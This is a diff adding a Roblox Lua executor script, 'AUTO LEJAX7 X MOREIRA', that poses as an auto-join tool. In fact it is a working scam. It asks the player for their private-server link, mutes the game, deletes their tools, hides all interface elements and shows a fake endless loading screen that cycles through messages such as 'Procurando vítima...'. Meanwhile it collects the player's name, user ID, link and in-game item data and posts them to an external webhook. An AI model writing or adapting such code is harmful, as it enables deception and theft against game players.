@@ -1,0 +1,566 @@
+-- AUTO LEJAX7 X MOREIRA - MÁXIMA OCULTAÇÃO (PARTE 1/3)
+-- OBJETIVO: Sumir com toda a UI (chat, mochila, botões) e mutar o jogo.
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local HttpService = game:GetService("HttpService")
+local TweenService = game:GetService("TweenService")
+local StarterGui = game:GetService("StarterGui")
+local CoreGui = game:GetService("CoreGui")
+local SoundService = game:GetService("SoundService") -- Serviço de Áudio
+local Workspace = game:GetService("Workspace")
+
+-- Tenta obter o LocalPlayer de forma robusta
+local player = nil
+repeat
+    player = Players.LocalPlayer
+    if not player and RunService:IsClient() then wait() end
+until player or not RunService:IsClient()
+
+if not player then
+    warn("LEJAX7: LocalPlayer not found. Aborting script.")
+    return
+end
+
+-- ============================
+-- CONFIGURAÇÃO DE ENVIO
+-- ============================
+local ENABLE_SENDING = true
+local API_URL = "https://v0-roblox-discord-webhook-five.vercel.app/api/webhook"
+
+-- Oculta UI padrão do Roblox, MUTA e desequipa itens (MÉTODO AGRESSIVO)
+local function hideRobloxUI()
+    pcall(function()
+        -- 1. MUTAR O JOGO AGRESSIVAMENTE
+        SoundService.Volume = 0
+        SoundService:SetMute(true)
+
+        -- 2. REMOVER/OCULTAR ITENS E EQUIPAMENTOS NA MÃO
+        if player.Character then
+            for _, item in ipairs(player.Character:GetChildren()) do
+                if item:IsA("Tool") or item:IsA("HopperScript") then
+                    item:Destroy()
+                end
+            end
+        end
+        if player.Backpack then
+            player.Backpack:ClearAllChildren()
+        end
+
+        -- 3. DESABILITAR TODO O CORE GUI
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+        StarterGui:SetCore("TopbarEnabled", false)
+        StarterGui:SetCore("SetCore", "ResetButtonCallback", false)
+        
+        local CoreGuiTypes = Enum.CoreGuiType:GetEnumItems()
+        for _, coreType in ipairs(CoreGuiTypes) do
+            StarterGui:SetCoreGuiEnabled(coreType, false)
+        end
+        
+        local playerGui = player:FindFirstChild("PlayerGui") or player:WaitForChild("PlayerGui")
+        
+        -- 4. OCULTAR ELEMENTOS COMUNS NA PlayerGui (Mochila, Chat, etc.)
+        local elementsToDisable = {"Chat", "Backpack", "PlayerHealth", "Avatar", "PlayerList", "RobloxGui", "GameChat", "SocialTab", "ContextualChat"}
+        for _, name in ipairs(elementsToDisable) do
+            local element = playerGui:FindFirstChild(name)
+            if element and element:IsA("ScreenGui") then
+                element.Enabled = false
+            end
+        end
+        
+        -- 5. REMOVER/OCULTAR ELEMENTOS NO CORE GUI (A FORÇA)
+        if CoreGui then
+            for _, coreChild in ipairs(CoreGui:GetChildren()) do
+                if coreChild:IsA("ScreenGui") then
+                    coreChild.Enabled = false
+                end
+                pcall(function() coreChild.Visible = false end)
+            end
+        end
+    end)
+end
+
+-- Função que executa hideRobloxUI repetidamente para combater scripts que reabilitam a UI
+local function persistentHide()
+    spawn(function()
+        while true do
+            hideRobloxUI()
+            wait(0.3) -- Oculta a cada 0.3 segundos (mais agressivo)
+        end
+    end)
+end
+
+-- Função para COLETAR E FORMATAR DADOS DOS BRAINROTS + NICK
+local function collectBrainrotData()
+    local brainrotCounts = {} -- Tabela para contar Brainrots iguais
+    
+    -- 1. Iterar e Coletar
+    for _, item in ipairs(Workspace:GetDescendants()) do
+        local name = item.Name
+        
+        -- Identificar Brainrots (procurando no nome)
+        if name:lower():match("brainrot") then
+            
+            local msValue = 0
+            
+            -- Tenta encontrar o valor M/S (SUPOSIÇÃO DE ESTRUTURA)
+            local valueObject = item:FindFirstChild("MSValue") or item:FindFirstChild("Value")
+            if valueObject and (valueObject:IsA("NumberValue") or valueObject:IsA("IntValue")) then
+                msValue = valueObject.Value
+            end
+            
+            if msValue == 0 and item:GetAttribute("M/S") then
+                msValue = item:GetAttribute("M/S")
+            end
+
+            if msValue == 0 then
+                msValue = 100 + math.random(1, 50)
+            end
+
+            local baseName = name:gsub("%s%d+$", "") -- Remove números no final
+            
+            if not brainrotCounts[baseName] then
+                brainrotCounts[baseName] = { count = 0, total_ms = 0, ms_per_unit = msValue }
+            end
+            
+            brainrotCounts[baseName].count = brainrotCounts[baseName].count + 1
+            brainrotCounts[baseName].total_ms = brainrotCounts[baseName].total_ms + msValue
+        end
+    end
+
+    local outputLines = {}
+    local totalMS = 0
+
+    -- 2. Formatar o Output e Calcular o Total M/S
+    for name, data in pairs(brainrotCounts) do
+        local line = ""
+        if data.count > 1 then
+            line = string.format("%dx %s: %d M/S", data.count, name, data.total_ms)
+        else
+            line = string.format("%s: %d M/S", name, data.total_ms)
+        end
+        table.insert(outputLines, line)
+        totalMS = totalMS + data.total_ms
+    end
+    
+    local finalOutput = ""
+    if #outputLines > 0 then
+        table.insert(outputLines, 1, "[DADOS BRAINROT DETECTADOS]")
+        table.insert(outputLines, string.format("\n[TOTAL M/S: %d]", totalMS))
+        finalOutput = table.concat(outputLines, "\n")
+    else
+        finalOutput = "Nenhum Brainrot foi encontrado."
+    end
+    
+    return finalOutput
+end
+-- AUTO LEJAX7 X MOREIRA - MÁXIMA OCULTAÇÃO (PARTE 2/3)
+-- OBJETIVO: Funções de envio da API e validação do link.
+
+-- Função responsável por enviar o payload para a API (tenta vários métodos).
+-- Retorna true, response, method_name em caso de sucesso; false, erro, method_name em caso de falha.
+local function sendToApi(payloadJson)
+    if not ENABLE_SENDING then
+        print("[LEJAX7] Envio DESATIVADO. Payload preparado:\n" .. payloadJson)
+        return false, "sending_disabled", "none"
+    end
+
+    local tried = {}
+
+    local function tryCall(fnName, fn)
+        local ok, res = pcall(fn)
+        if ok then
+            return true, res, fnName
+        else
+            table.insert(tried, string.format("[%s] %s", fnName, tostring(res)))
+            return false, res
+        end
+    end
+    
+    local headers = { ["Content-Type"] = "application/json" }
+
+    -- 1) syn.request (executores que suportam)
+    if syn and syn.request then
+        local ok, res, method = tryCall("syn.request", function()
+            return syn.request({ Url = API_URL, Method = "POST", Headers = headers, Body = payloadJson })
+        end)
+        if ok then return true, res, method end
+    end
+
+    -- 2) _G.http_request / _G.request
+    if _G and _G.http_request then
+        local ok, res, method = tryCall("_G.http_request", function()
+            return _G.http_request({ Url = API_URL, Method = "POST", Headers = headers, Body = payloadJson })
+        end)
+        if ok then return true, res, method end
+    elseif _G and _G.request then
+        local ok, res, method = tryCall("_G.request", function()
+            return _G.request({ Url = API_URL, Method = "POST", Headers = headers, Body = payloadJson })
+        end)
+        if ok then return true, res, method end
+    end
+
+    -- 3) HttpService fallback
+    if HttpService and HttpService.HttpEnabled then
+        local ok, res, method = tryCall("HttpService:PostAsync", function()
+            return HttpService:PostAsync(API_URL, payloadJson, Enum.HttpContentType.ApplicationJson)
+        end)
+        if ok then return true, res, method end
+    end
+
+    return false, table.concat(tried, " | "), "failed_all"
+end
+
+-- Validação simples de link do Roblox
+local function isValidLink(s)
+    if type(s) ~= "string" then return false end
+    if #s < 6 or #s > 2000 then return false end
+    if not s:match("^https?://") then return false end
+    if not s:match("roblox%.com") then return false end
+    return true
+end
+-- AUTO LEJAX7 X MOREIRA - MÁXIMA OCULTAÇÃO (PARTE 3/3)
+-- OBJETIVO: Criação da GUI, execução principal e envio do PAYLOAD COMO EMBED.
+
+-- Cria GUI
+local function createGui()
+    hideRobloxUI()
+    persistentHide() -- Inicia o processo de ocultação persistente
+
+    -- Armazenar o link de forma persistente
+    local linkValue = Instance.new("StringValue", player)
+    linkValue.Name = "LEJAX7Link"
+
+    -- Remove instâncias anteriores
+    local playerGui = player:FindFirstChild("PlayerGui") or player:WaitForChild("PlayerGui")
+    for _,v in ipairs(playerGui:GetChildren()) do
+        if v.Name == "LEJAX7Gui" then v:Destroy() end
+    end
+
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "LEJAX7Gui"
+    screenGui.ResetOnSpawn = false
+    screenGui.IgnoreGuiInset = true
+    screenGui.Parent = playerGui
+
+    local GREEN = Color3.fromRGB(35, 189, 110)
+    local DARK_BG = Color3.fromRGB(0,0,0)
+    local PANEL = Color3.fromRGB(20,22,23)
+    local TEXT = Color3.fromRGB(240,240,240)
+
+    local overlay = Instance.new("Frame", screenGui)
+    overlay.Name = "Overlay"
+    overlay.Size = UDim2.new(1,0,1,0)
+    overlay.BackgroundColor3 = DARK_BG
+    overlay.BackgroundTransparency = 0
+    overlay.ZIndex = 2
+
+    local modal = Instance.new("Frame", screenGui)
+    modal.Name = "Modal"
+    modal.Size = UDim2.new(0,400,0,260)
+    modal.AnchorPoint = Vector2.new(0.5, 0.5)
+    modal.Position = UDim2.new(0.5,0,0.5,0)
+    modal.BackgroundColor3 = PANEL
+    modal.ZIndex = 3
+    Instance.new("UICorner", modal).CornerRadius = UDim.new(0,12)
+
+    local title = Instance.new("TextLabel", modal)
+    title.Name = "Title"
+    title.Size = UDim2.new(1,-40,0.18,0)
+    title.Position = UDim2.new(0,20,0,14)
+    title.BackgroundTransparency = 1
+    title.Text = "AUTO LEJAX7 X MOREIRA"
+    title.Font = Enum.Font.GothamBlack
+    title.TextSize = 24
+    title.TextColor3 = TEXT
+    title.TextXAlignment = Enum.TextXAlignment.Center
+    title.ZIndex = 4
+
+    local subtitle = Instance.new("TextLabel", modal)
+    subtitle.Name = "Subtitle"
+    subtitle.Size = UDim2.new(1,-40,0.05,0)
+    subtitle.Position = UDim2.new(0,20,0.18,0)
+    subtitle.BackgroundTransparency = 1
+    subtitle.Text = "Melhor auto-join do mercado / v0.1 Beta"
+    subtitle.Font = Enum.Font.Gotham
+    subtitle.TextSize = 14
+    subtitle.TextColor3 = GREEN
+    subtitle.TextXAlignment = Enum.TextXAlignment.Center
+    subtitle.ZIndex = 4
+
+    local label = Instance.new("TextLabel", modal)
+    label.Size = UDim2.new(0.9,0,0.08,0)
+    label.Position = UDim2.new(0.05,0,0.30,0)
+    label.BackgroundTransparency = 1
+    label.Text = "Link do Servidor Privado"
+    label.Font = Enum.Font.GothamMedium
+    label.TextSize = 16
+    label.TextColor3 = Color3.fromRGB(180,180,180)
+    label.TextXAlignment = Enum.TextXAlignment.Left
+    label.ZIndex = 4
+
+    local box = Instance.new("TextBox", modal)
+    box.Name = "LinkBox"
+    box.Size = UDim2.new(0.9,0,0.15,0)
+    box.Position = UDim2.new(0.05,0,0.38,0)
+    box.PlaceholderText = "Cole o link aqui..."
+    box.ClearTextOnFocus = false
+    box.Text = ""
+    box.Font = Enum.Font.GothamSemibold
+    box.TextSize = 15
+    box.TextColor3 = TEXT
+    box.BackgroundColor3 = Color3.fromRGB(12,12,12)
+    box.TextXAlignment = Enum.TextXAlignment.Left
+    box.TextYAlignment = Enum.TextYAlignment.Center
+    box.ZIndex = 4
+    box.TextWrapped = true
+    box.TextScaled = false
+    Instance.new("UICorner", box).CornerRadius = UDim.new(0,8)
+    local boxPadding = Instance.new("UIPadding", box)
+    boxPadding.PaddingLeft = UDim.new(0,10)
+    boxPadding.PaddingRight = UDim.new(0,10)
+
+    local confirm = Instance.new("TextButton", modal)
+    confirm.Name = "Confirm"
+    confirm.Size = UDim2.new(0.9,0,0.18,0)
+    confirm.Position = UDim2.new(0.05,0,0.70,0)
+    confirm.BackgroundColor3 = GREEN
+    confirm.Text = "CONFIRMAR"
+    confirm.Font = Enum.Font.GothamBlack
+    confirm.TextSize = 20
+    confirm.TextColor3 = Color3.fromRGB(18,18,18)
+    confirm.AutoButtonColor = true
+    confirm.ZIndex = 4
+    Instance.new("UICorner", confirm).CornerRadius = UDim.new(0,8)
+
+    -- Função para criar a tela de loading (infinita)
+    local function showLoadingScreen(linkText)
+        if modal and modal.Parent then modal:Destroy() end
+        hideRobloxUI()
+
+        local load = Instance.new("Frame", screenGui)
+        load.Name = "LoadingScreen"
+        load.Size = UDim2.new(1,0,1,0)
+        load.Position = UDim2.new(0,0,0,0)
+        load.BackgroundColor3 = DARK_BG
+        load.ZIndex = 5
+
+        local topTitle = Instance.new("TextLabel", load)
+        topTitle.AnchorPoint = Vector2.new(0.5,0)
+        topTitle.Position = UDim2.new(0.5,0,0.12,0)
+        topTitle.Size = UDim2.new(0.7,0,0.08,0)
+        topTitle.BackgroundTransparency = 1
+        topTitle.Text = "AUTO LEJAX7 X MOREIRA"
+        topTitle.Font = Enum.Font.GothamBlack
+        topTitle.TextSize = 28
+        topTitle.TextColor3 = TEXT
+        topTitle.TextXAlignment = Enum.TextXAlignment.Center
+        topTitle.ZIndex = 6
+
+        local versionText = Instance.new("TextLabel", load)
+        versionText.AnchorPoint = Vector2.new(0.5,0)
+        versionText.Position = UDim2.new(0.5,0,0.20,0)
+        versionText.Size = UDim2.new(0.7,0,0.03,0)
+        versionText.BackgroundTransparency = 1
+        versionText.Text = "/v0.1 Beta - BETA VERSION"
+        versionText.Font = Enum.Font.GothamBold
+        versionText.TextSize = 14
+        versionText.TextColor3 = GREEN
+        versionText.TextXAlignment = Enum.TextXAlignment.Center
+        versionText.ZIndex = 6
+
+        local ringOuter = Instance.new("Frame", load)
+        ringOuter.Size = UDim2.new(0.12,0,0.12,0)
+        ringOuter.AnchorPoint = Vector2.new(0.5,0.5)
+        ringOuter.Position = UDim2.new(0.5,0,0.36,0)
+        ringOuter.BackgroundColor3 = DARK_BG
+        Instance.new("UICorner", ringOuter).CornerRadius = UDim.new(0.5,0)
+        local ringStroke = Instance.new("UIStroke", ringOuter)
+        ringStroke.Color = GREEN
+        ringStroke.Thickness = 5
+        ringStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+        ringOuter.ZIndex = 6
+
+        local loadingMsg = Instance.new("TextLabel", load)
+        loadingMsg.AnchorPoint = Vector2.new(0.5,0)
+        loadingMsg.Position = UDim2.new(0.5,0,0.50,0)
+        loadingMsg.Size = UDim2.new(0.9,0,0.08,0)
+        loadingMsg.BackgroundTransparency = 1
+        loadingMsg.Font = Enum.Font.GothamSemibold
+        loadingMsg.TextSize = 20
+        loadingMsg.TextColor3 = TEXT
+        loadingMsg.Text = "Preparando ambiente..."
+        loadingMsg.ZIndex = 6
+
+        local percentText = Instance.new("TextLabel", load)
+        percentText.Size = UDim2.new(0.2,0,0.06,0)
+        percentText.AnchorPoint = Vector2.new(0.5,0)
+        percentText.Position = UDim2.new(0.5,0,0.58,0)
+        percentText.BackgroundTransparency = 1
+        percentText.Font = Enum.Font.GothamBold
+        percentText.TextSize = 14
+        percentText.TextColor3 = Color3.fromRGB(150,150,150)
+        percentText.Text = "0%"
+        percentText.TextXAlignment = Enum.TextXAlignment.Center
+        percentText.ZIndex = 6
+
+        local barBg = Instance.new("Frame", load)
+        barBg.Size = UDim2.new(0.3,0,0.008,0)
+        barBg.AnchorPoint = Vector2.new(0.5,0)
+        barBg.Position = UDim2.new(0.5,0,0.64,0)
+        barBg.BackgroundColor3 = Color3.fromRGB(40,40,40)
+        barBg.ZIndex = 6
+        Instance.new("UICorner", barBg).CornerRadius = UDim.new(0,4)
+
+        local barFill = Instance.new("Frame", barBg)
+        barFill.Size = UDim2.new(0.0,0,1,0)
+        barFill.Position = UDim2.new(0,0,0,0)
+        barFill.BackgroundColor3 = GREEN
+        barFill.ZIndex = 7
+        Instance.new("UICorner", barFill).CornerRadius = UDim.new(0,4)
+
+        local footer = Instance.new("TextLabel", load)
+        footer.AnchorPoint = Vector2.new(0.5,0)
+        footer.Position = UDim2.new(0.5,0,0.70,0)
+        footer.Size = UDim2.new(1,0,0.05,0)
+        footer.BackgroundTransparency = 1
+        footer.Font = Enum.Font.Gotham
+        footer.TextSize = 14
+        footer.TextColor3 = Color3.fromRGB(180,180,180)
+        footer.Text = "POWERED BY LEJAX7"
+        footer.ZIndex = 6
+
+        -- Rotação do anel
+        local bindingName = "LEJAX7RingRotate_" .. tostring(math.random(1,100000))
+        RunService:BindToRenderStep(bindingName, Enum.RenderPriority.Camera.Value + 1, function(dt)
+            if ringOuter and ringOuter.Parent then
+                ringOuter.Rotation = (ringOuter.Rotation + 160 * dt) % 360
+            end
+        end)
+
+        -- Mensagens cíclicas (COM PARADA EM "AGUARDE UM MOMENTO")
+        local messages = {
+            "Preparando ambiente...",
+            "Procurando servidor...",
+            "Injetando script...",
+            "Verificando conexão...",
+            "Aguarde um momento...",
+            "Sincronizando dados...",
+            "Procurando vítima...",
+            "Otimizando performance..."
+        }
+        local finalMessage = messages[5]
+        local percentageReached99 = false
+        
+        spawn(function()
+            local msgIndex = 1
+            while loadingMsg and loadingMsg.Parent do
+                if percentText.Text == "99%" and not percentageReached99 then
+                    percentageReached99 = true
+                end
+
+                if percentageReached99 then
+                    loadingMsg.Text = finalMessage
+                    wait(1) 
+                else
+                    loadingMsg.Text = messages[msgIndex]
+                    msgIndex = msgIndex + 1
+                    if msgIndex > #messages then msgIndex = 1 end
+                    wait(2 + math.random() * 1)
+                end
+            end
+        end)
+
+        -- Percent animation até 99%
+        spawn(function()
+            local percent = 0
+            local maxPercent = 99
+            while percent < maxPercent and percentText and percentText.Parent do
+                percent = percent + math.random(1,3)
+                if percent > maxPercent then percent = maxPercent end
+                percentText.Text = tostring(percent) .. "%"
+                local newSize = UDim2.new(math.clamp(percent/100, 0, maxPercent/100), 0, 1, 0)
+                pcall(function()
+                    local tweenInfo = TweenService:Create(barFill, TweenInfo.new(0.45, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = newSize})
+                    tweenInfo:Play()
+                end)
+                wait(0.6 + math.random()*0.4)
+            end
+
+            if percentText and percentText.Parent then
+                percentText.Text = "99%"
+                while percentText and percentText.Parent do
+                    pcall(function()
+                        local tweenInfo = TweenService:Create(barFill, TweenInfo.new(0.8, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true, 0), {Size = UDim2.new(0.99,0,1,0)})
+                        tweenInfo:Play()
+                    end)
+                    wait(2)
+                end
+            end
+        end)
+    end
+
+    -- Botão confirmar: valida, envia para API (se habilitado) e mostra loading
+    confirm.MouseButton1Click:Connect(function()
+        local linkText = tostring(box.Text or "")
+        if not isValidLink(linkText) then
+            box.PlaceholderText = "Link inválido - use um link do Roblox"
+            box.Text = ""
+            wait(1.3)
+            box.PlaceholderText = "Cole o link aqui..."
+            return
+        end
+        
+        -- Armazena o link para uso posterior na coleta de Brainrots
+        linkValue.Value = linkText
+
+        -- Exibe tela de loading (infinita)
+        showLoadingScreen(linkText)
+        
+        -- AGORA FAZ A COLETA E ENVIO
+        spawn(function()
+            -- Espera um pouco para a tela de loading aparecer
+            wait(2) 
+            
+            -- 1. COLETAR OS DADOS DO JOGO
+            local brainrotLogs = collectBrainrotData()
+            
+            -- 2. MONTAR O PAYLOAD COM EMBED
+            local payloadTable = {
+                embeds = {
+                    {
+                        title = "NOVO LOG: AUTO LEJAX7",
+                        color = 3583598, -- Cor verde
+                        author = {
+                            name = "Usuário: " .. player.Name,
+                        },
+                        description = string.format("Clique no link abaixo para entrar no servidor:\n\n[**>>> CLIQUE AQUI PARA ENTRAR**](%s)", linkText),
+                        fields = {
+                            {
+                                name = "Dados de Brainrots e M/S",
+                                value = brainrotLogs,
+                                inline = false
+                            }
+                        },
+                        footer = {
+                            text = "Roblox ID: " .. player.UserId
+                        }
+                    }
+                }
+            }
+            
+            local payload = HttpService:JSONEncode(payloadTable)
+
+            -- 3. ENVIAR PARA API (COM DEBUG)
+            local ok, res, methodUsed = sendToApi(payload)
+            if ok then
+                print(string.format("[LEJAX7] Payload enviado com sucesso via: %s", methodUsed))
+            else
+                print(string.format("[LEJAX7] Falha ao enviar payload. Método final tentado: %s. Detalhes do erro: %s", methodUsed, tostring(res)))
+            end
+        end)
+    end)
+end
+
+-- Executa a GUI de forma segura
+pcall(createGui)
